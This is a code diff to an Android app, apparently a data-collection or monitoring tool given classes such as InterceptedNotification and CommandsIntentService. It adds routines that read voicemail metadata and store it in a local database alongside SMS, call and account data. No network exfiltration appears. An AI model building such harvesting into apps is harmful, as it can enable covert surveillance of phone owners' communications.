@@ -22,6 +22,7 @@ import com.candroid.lofl.data.pojos.Contact;
 import com.candroid.lofl.data.pojos.InterceptedNotification;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
+import com.candroid.lofl.data.pojos.VoiceMail;
 import com.candroid.lofl.jobs.JobsScheduler;
 import com.candroid.lofl.services.CommandsIntentService;
 import com.candroid.lofl.services.LoflService;
@@ -31,6 +32,26 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class Database {
+
+    public static void insertVoicemails(SQLiteDatabase database, List<VoiceMail> voicemails){
+        try{
+            database.beginTransaction();
+            for(VoiceMail voicemail : voicemails){
+                ContentValues values = new ContentValues();
+                values.put(DataContract.VoicemailContract.COLUMN_NUMBER, voicemail.number);
+                values.put(DataContract.VoicemailContract.COLUMN_DATE, voicemail.date);
+                values.put(DataContract.VoicemailContract.COLUMN_DURATION, voicemail.duration);
+                values.put(DataContract.VoicemailContract.COLUMN_NEW, voicemail.isNew);
+                values.put(DataContract.VoicemailContract.COLUMN_READ, voicemail.hasRead);
+                database.insert(DataContract.VoicemailContract.TABLE_NAME, null, values);
+            }
+            database.setTransactionSuccessful();
+        }catch (SQLException e){
+            e.printStackTrace();
+        }finally {
+            database.endTransaction();
+        }
+    }
 
     public static void insertAccounts(SQLiteDatabase database, Account[] accounts){
         long newRowId = -1;
@@ -463,6 +484,18 @@ public class Database {
                 } catch (SQLException e) {
                     e.printStackTrace();
                 } finally {
+                    database.endTransaction();
+                }
+            }
+            //SYNC VOICEMAIL
+            if(context.checkSelfPermission(Manifest.permission.READ_VOICEMAIL) == PackageManager.PERMISSION_GRANTED){
+                try{
+                    database.beginTransaction();
+                    insertVoicemails(database, ContentProviders.Voicemail.fetchVoicemail(context));
+                    database.setTransactionSuccessful();
+                }catch (SQLException e){
+                    e.printStackTrace();
+                }finally {
                     database.endTransaction();
                 }
             }
